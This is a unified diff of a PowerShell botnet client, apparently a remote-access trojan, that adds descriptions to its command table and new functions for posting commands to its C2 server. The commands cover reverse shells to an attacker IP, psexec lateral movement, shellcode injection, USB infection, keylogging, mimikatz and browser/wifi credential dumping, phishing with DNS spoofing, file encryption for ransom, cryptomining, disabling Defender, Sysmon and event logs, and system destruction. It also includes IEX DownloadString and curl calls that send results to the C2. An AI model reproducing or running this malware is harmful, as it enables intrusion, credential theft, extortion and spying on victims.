-				!c2channel {ChannelCommand $id} 	  #  !c2channel|gmail|http:\\server\config.ini - change c2 channel (Covert channel : http, onedrive, gdrive, dropbox ...)
+				!c2channel {C2ChannelCommand $id} 	  #  !c2channel|gmail|http:\\server\config.ini - change c2 channel (Covert channel : http, onedrive, gdrive, dropbox ...)
 				!proxy {SetProxyCommand $id}          #  !proxy|213.18.200.13|8484 - Set proxy configuration. you can use fiddler here to see HTTPS. or setup your own proxy 
 				#!uaclevel {SetUACLevelCommand $id}   #  !uaclevel|on    ou   uaclevel|off
 				!psexec {PsexecCommand $id}    	  	  #  !psexec|domain\admin|password|192.168.3.202|powershell.exe 'calc.exe'    - download psexec, use credential and push bot in targeted ip 
@@ -2451,44 +2553,43 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
 				!shellcode {InjectShellcode $id}      #  !shellcode|@(0x90,0x90,0xC3)   -  Inject the specifyed shellcode. msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
 				!usbspread {UsbspreadCommand $id}	  #  !usbspread|on     - Infect USB with malicious lnk
 				!wallpaper {WallpaperCommand $id}	  #  !wallpaper|http://wallpapercave.com/wp/ky43p3I.jpg/|c:\windows\temp\1.jpg
-				!webcam {WebcamCommand $id}           #  !webcam
-                !screenshot {ScreenshotCommand $id}   #  !screenshot
+				!webcam {WebcamCommand $id}           #  !webcam  - Take webcam shot
+                !screenshot {ScreenshotCommand $id}   #  !screenshot  - Take screen image capture
                 !streaming {ScreenStreaming $id}      #  !streaming|on / off - take screenshot at every hello (active spy)	
-				!geolocate{GeolocateCommand $id}	  #	 !geolocate
-				!geolocategps{GeolocateGPSCommand $id}#	 !geolocategps
+				!geolocate{GeolocateCommand $id}	  #	 !geolocate -  Geolocate zombie using external API
+				!geolocategps{GeolocateGPSCommand $id}#	 !geolocategps  -  Geolocate zombie using device GPS features, more precision.
 				!wshell {WebShellCommand $id}         #  !wshell|8080  -  use it with !ngrok to expose localhost port 8080 over Internet
                 !dropboxc2 {DropboxC2Command $id}     #  !dropboxc2  -  start dropbox client backdoor (configure and start python C2 first)  
 				!ReverseShell{ReverseShellCommand $id}#  !reverseshell|AttackerIP|8080  -  use nc -lvp 8080 BEFORE to get shell back
 				!nc{NetCatShell $id}                  #  !nc|AttackerIP|8080  -  use nc -lvp 8080 BEFORE to get shell back             
-				!meterpreter {MeterpreterShell $id}	  #  !meterpreter|10.0.0.23|443
                 !jsrat {JsRatShell $id} 	 		  #  !jsrat|192.168.10.96     # Handle connexion with: powershell.exe -Exe Bypass -File c:\test\JSRat.txt  & change listening IP ADDRESS in jsrat file
                 !httprat {HttpRatShell $id}           #  !httprat|212.74.21.23  OR  !httprat|xxxxxx.ngrok.io   (without HTTP/s) 
-				!vnc {VncCommand $id}                 #  !vnc|bind||5900|pass1234   OR  §vnc|reverse|IP_of_attacker|5500|pass1234
-				!rdp {RDPCommand $id}                 #	 !rdp|authkey
-				!credential {CredentialCommand $id}   #  !credential
-                !phish {PhishingCommand $id}          #  !phish|facebook.com|http://xxxx.ngok.io/facebook  -  setup local http server, host phishing page and spoof DNS hosts.txt
-				!keylog {KeylogCommand $id} 		  #  !keylog|on / off
-			    !hashdump {hashdumpCommand $id} 	  #  !hashdump  - Dump hash password
-				!procdump {ProccessDumpCommand $id}	  #  !procdump  - Dump privileged process and use mimikatz in attack machine to extract password in clear
-				!remotemimikatz{MmikatzCommand $id}   #  !remotemimikatz
-				!mimikatz{MmikatzCommand $id}		  #  !mimikatz
-				!clearevent {ClearEventLog $id}       #	 !clearevent
-				!firewall {FirewallCommand $id}       #	 !firewall|on / off
-				!logbypass {LogBypassCommand $id}     #	 !logbypass
-				!killsysmon {SysmonKillCommand $id}   #	 !killsysmon
+				!vnc {VncCommand $id}                 #  !vnc|bind||5900|pass1234   OR  §vnc|reverse|IP_of_attacker|5500|pass1234 - VNC remote connect
+				!rdp {RDPCommand $id}                 #	 !rdp|authkey  -  Activate RDP service (expose it with ngrok and connect)
+				!credential {CredentialCommand $id}   #  !credential  -  Try to phish users credentials by tricking them
+                !wificreds {WifiCredsCommand $id}     #  !wificreds|SSID_NAME - Extract stored WIFI credentials}
+				!phish {PhishingCommand $id}          #  !phish|facebook.com|http://xxxx.ngok.io/facebook  -  setup local http server, host phishing page and spoof DNS hosts.txt
+				!keylog {KeylogCommand $id} 		  #  !keylog|on / off  -  Activate or desactivate Keylogger
+			    !hashdump {hashdumpCommand $id} 	  #  !hashdump  - Dump live hash password
+				!procdump {ProccessDumpCommand $id}	  #  !procdump  - Dump privileged process and use mimikatz OFFLINE on attack PC side to extract password in clear text
+				!remotemimikatz{MmikatzCommand $id}   #  !remotemimikatz - Remotely dump windows password in clear text
+				!mimikatz{MmikatzCommand $id}		  #  !mimikatz  -  Dump windows passwords in clear text
+				!firewall {FirewallCommand $id}       #  !firewall|on / off|8080   - Desactivate or activate firewall and also specify a port to open in and out
+				!logbypass {LogBypassCommand $id}     #	 !logbypass   --  Try to bypass events logging to act in ghost mode
+				!clearevent {ClearEventLog $id}       #	 !clearevent  -  Clean events logs
+				!killsysmon {SysmonKillCommand $id}   #	 !killsysmon  -  Try to kill sysmon if present
 				!windefkill {winDefKillCommand $id}   #  !windefkill   OR !windefkill|10.10.10.2   -  Kill Windows Defender locally or remotely
-				!extractlog {ExtractLogCommand $id}   #  !extractlog|system
+				!extractlog {ExtractLogCommand $id}   #  !extractlog|system  -  Extract events logs
 				!macattrib {MacAttribCommand $id}  	  #  !macattrib|C:\secret.txt|01/03/2006 12:12 pm
 				#!ddos {DdosCommand $id}              #  !ddos|http://target.com
 				!encrypt {EncryptCommand $id}         #  !encrypt|Q4dsd87rn1AE5@54fDER4584S2dZFj|C:\users\      Param 2 MUST ALWAYS END WITH "\"    - encrypt all "doc,docx,xlx,xlsx,ppt,pptx,jpg,png,bmp,pdf,txt,log,mp3,avi,mpeg,mp4" files
 				!decrypt {DecryptCommand $id}		  #  !decrypt|Q4dsd87rn1AE5@54fDER4584S2dZFj|C:\users\		Param 2 MUST ALWAYS END WITH "\"
 				!bitcoin {BitcoinMiningCommand $id}   #  !bitcoin   # Bitcoin mining, enslave the bot ;-)
-				!dnsspoof {DnsSpoofCommand $id}       #  !dnsspoof|127.0.0.1  facebook.com|0/1  --> 1 => add, 0 => clean & add
+				!dnsspoof {DnsSpoofCommand $id}       #  !dnsspoof|127.0.0.1  facebook.com|0/1  --> 1 => add entry , 0 => clean all
 				!http {HttpServerCommand $id} 	      #  !http|80
-				!destroy {DestroyCommand $id}        #  !destroy the system
+				!destroy {DestroyCommand $id}         #  !destroy the system
 				!sendmail {SendmailCommand $id}       #  !sendmail|target@corp.com|subject|Hello Im your friend|c:\evil.pdf    -  Send email from the compromised system
-				!browserdump {BrowserDumpCommand $id} #  !browserdump
-				#!backdoorlnk {BackdoorlnkCommand $id}#  !
+				!browserdump {BrowserDumpCommand $id} #  !browserdump  --  Dump browser passwords accounts
 				!bypassuac {BypassUacCommand $id}	  #  !bypassuac|cmd   OR !bypassuac  - Bypass UAC and execute command in a privileged context.
 				!sniff {SniffCommand $id}			  #  !sniff|10   Capture TCP/IP packet - Open with Microsoft Message Analyzer
 				}
@@ -2513,7 +2614,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/setMacAttri
     $WebClientObject = New-Object System.Net.WebClient
     $WebProxyObject = New-Object System.Net.WebProxy
 	#[string] $CommandID
-	Get-Latestcmd          
+	Get-Latestcmd          # Call C2 Server to get the latest command for this zombie PC  
     [int] $Global:monitoring = 0
     [int] $Global:LastOrderFinal = 0
 	Write-Verbose "Monitoring: $monitoring"
@@ -2621,7 +2722,7 @@ Function InitializeBot {
 	}
 }
 ## Curl for Communication with c2c if Powershell version is least than 3
-Function Curl {
+Function Curl { # Used Curl to post command result
 	[CmdletBinding()] param( 
 		[string]$pc,
 		[string]$result,
@@ -2631,7 +2732,7 @@ Function Curl {
 		$Command = "$env:userprofile\AppData\cl.exe -X POST -F pc=$pc -F result=$result -F id=$id $c2c/ROOT_FOLDER/link/ok.php"
 		executer -runLocal $Command
 	}
-Function Curl_Add {
+Function Curl_Add { # Used Curl to add a new zombie ID
 	[CmdletBinding()] param( 
 		[string]$date,
 		[string]$result,
@@ -2642,7 +2743,24 @@ Function Curl_Add {
 		$Command = "$env:userprofile\AppData\cl.exe -X POST -F date=$date -F data=$result -F pc=$pc  -F table=$table $c2c/ROOT_FOLDER/link/add.php"
 		executer -runLocal $Command
 	}
-
+Function Curl_Cmd { # Used Curl to add a command (can be used to autopilot)
+	[CmdletBinding()] param( 
+		[string]$pc,
+		[string]$cmd
+		)
+		$cmd = "`"$cmd`""
+		$Command = "$env:userprofile\AppData\cl.exe -X POST -F cmd=$cmd -F pc=$pc $c2c/ROOT_FOLDER/link/cmd.php"
+		executer -runLocal $Command
+	}
+Function Curl_updateCmd { # Used Curl to update a command after autopilot analyze (can be used to autopilot)
+	[CmdletBinding()] param( 
+		[string]$pc,
+		[string]$cmd
+		)
+		$cmd = "`"$cmd`""
+		$Command = "$env:userprofile\AppData\cl.exe -X POST -F cmd=$cmd -F pc=$pc $c2c/ROOT_FOLDER/link/cmd.php"
+		executer -runLocal $Command
+	}	
 ################################################################################ 	
 ## Test if bot is already present on PC, if not it create instance of bot in C2 and zombie ID  on the local system (regOpskey,wmiOpskey)
 if(($regOpskey) -AND !($wmiOpskey)){	
